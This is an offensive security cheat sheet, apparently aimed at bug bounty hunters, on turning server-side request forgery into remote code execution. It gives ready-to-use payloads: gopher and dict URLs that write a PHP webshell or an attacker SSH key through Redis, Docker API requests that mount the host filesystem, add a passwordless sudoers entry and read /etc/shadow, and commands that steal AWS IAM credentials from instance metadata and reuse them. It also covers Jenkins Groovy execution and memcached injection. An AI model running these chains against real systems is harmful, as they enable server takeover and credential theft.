# SSRF → RCE

From making server requests to executing code.

## Overview

SSRF alone is often medium severity. Chain to RCE for critical impact.

```
SSRF → Internal Service → Exploit Service → RCE
           ↓                    ↓
       Redis/Memcached    Write webshell / SSH key
       Docker API         Container with host mount
       Cloud metadata     IAM creds → Cloud RCE
```

## Chain 1: SSRF → Redis → RCE

### Requirements

- Redis accessible internally (usually 6379)
- Redis without authentication
- Write access to web directory OR SSH directory

### Via Gopher Protocol

```bash
# Write PHP webshell
gopher://127.0.0.1:6379/_
*3%0D%0A$3%0D%0ASET%0D%0A$5%0D%0Ashell%0D%0A$31%0D%0A<?php system($_GET['cmd']); ?>%0D%0A
*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A
*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A
*1%0D%0A$4%0D%0ASAVE%0D%0A
*1%0D%0A$4%0D%0AQUIT%0D%0A
```

### Using Gopherus

```bash
python gopherus.py --exploit redis

# Choose: ReverseShell / PHPShell
# Enter webroot: /var/www/html
# Get gopher URL
```

### Via Dict Protocol

```bash
# Less powerful but works
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php  
dict://127.0.0.1:6379/SET%20x%20"<?php system($_GET['cmd']); ?>"
dict://127.0.0.1:6379/SAVE
```

### SSH Key Injection

```bash
# Write SSH key instead
gopher://127.0.0.1:6379/_
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA... attacker@host\n\n"
SAVE
```

## Chain 2: SSRF → Docker API → RCE

### Requirements

- Docker API exposed on 2375/2376
- No TLS authentication

### Exploitation

```bash
# Step 1: List containers
GET http://127.0.0.1:2375/containers/json

# Step 2: Create container with host mount
POST http://127.0.0.1:2375/containers/create
Content-Type: application/json

{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /mnt/etc/sudoers"],
  "Binds": ["/:/mnt"],
  "Privileged": true
}

# Step 3: Start container
POST http://127.0.0.1:2375/containers/{id}/start

# Step 4: Execute command
POST http://127.0.0.1:2375/containers/{id}/exec
{
  "AttachStdin": false,
  "AttachStdout": true,
  "AttachStderr": true,
  "Cmd": ["cat", "/mnt/etc/shadow"]
}
```

## Chain 3: SSRF → FastCGI → RCE

### Requirements

- PHP-FPM accessible internally (usually 9000)
- Know path to a PHP file

### Using Gopherus

```bash
python gopherus.py --exploit fastcgi

# Enter PHP file path: /var/www/html/index.php
# Enter command: id
# Get gopher URL
```

### Attack Flow

1. SSRF to gopher://127.0.0.1:9000
2. Gopher sends FastCGI request
3. FastCGI executes PHP with injected code
4. RCE achieved

## Chain 4: SSRF → AWS Metadata → RCE

### Requirements

- Running on AWS EC2
- Instance has IAM role with permissions
- IMDSv1 enabled (or can bypass IMDSv2)

### Exploitation

```bash
# Step 1: Get role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Returns:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

### AWS to RCE

```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Check permissions
aws sts get-caller-identity

# If Lambda access
aws lambda list-functions
aws lambda invoke --function-name X ...

# If EC2 access
aws ec2 describe-instances
aws ssm send-command --instance-ids i-xxx --document-name "AWS-RunShellScript" --parameters 'commands=["whoami"]'

# If S3 with sensitive data
aws s3 ls
aws s3 cp s3://bucket/secrets.env .
```

## Chain 5: SSRF → Internal Jenkins → RCE

### Requirements

- Jenkins accessible internally (8080)
- Script console enabled (usually /script)

### Exploitation

```bash
# Access script console
GET http://127.0.0.1:8080/script

# Execute Groovy
POST http://127.0.0.1:8080/script
script=println "whoami".execute().text
```

## Chain 6: SSRF → Memcached → Injection

### Requirements

- Memcached on 11211
- Application uses memcached for sessions/cache

### Exploitation

```bash
# Inject serialized object
dict://127.0.0.1:11211/set session:admin 0 3600 [length]
[serialized_malicious_object]

# Or cache poisoning
dict://127.0.0.1:11211/set cached_page 0 3600 50
<script>alert(document.cookie)</script>
```

## Chain 7: SSRF → Internal Git → Source Code

Not RCE but valuable:

```bash
# GitLab/GitHub Enterprise
http://127.0.0.1:3000/api/v4/projects
http://127.0.0.1:3000/user/repo/raw/master/.env

# Gitea
http://127.0.0.1:3000/api/v1/repos
```

---

## Impact Escalation Table

| Starting SSRF | Chain | Final Impact |
|---------------|-------|--------------|
| Blind SSRF | → DNS exfil | Low |
| Read internal | → Source code | Medium |
| Redis access | → Webshell | Critical |
| Docker API | → Host compromise | Critical |
| AWS metadata | → Cloud takeover | Critical |
| Jenkins | → CI/CD compromise | Critical |

---

## PoC Template

```markdown
## Summary
SSRF in [endpoint] can be chained with [internal service] to achieve RCE.

## Chain
1. SSRF allows requests to internal network
2. [Service] is accessible on [port]
3. Using [protocol/technique], arbitrary code execution is possible

## Steps
1. [SSRF step]
2. [Internal service exploitation step]
3. [RCE step]

## Impact
Full server compromise via SSRF → [Service] → RCE chain.
Attacker can execute arbitrary commands on the server.
```
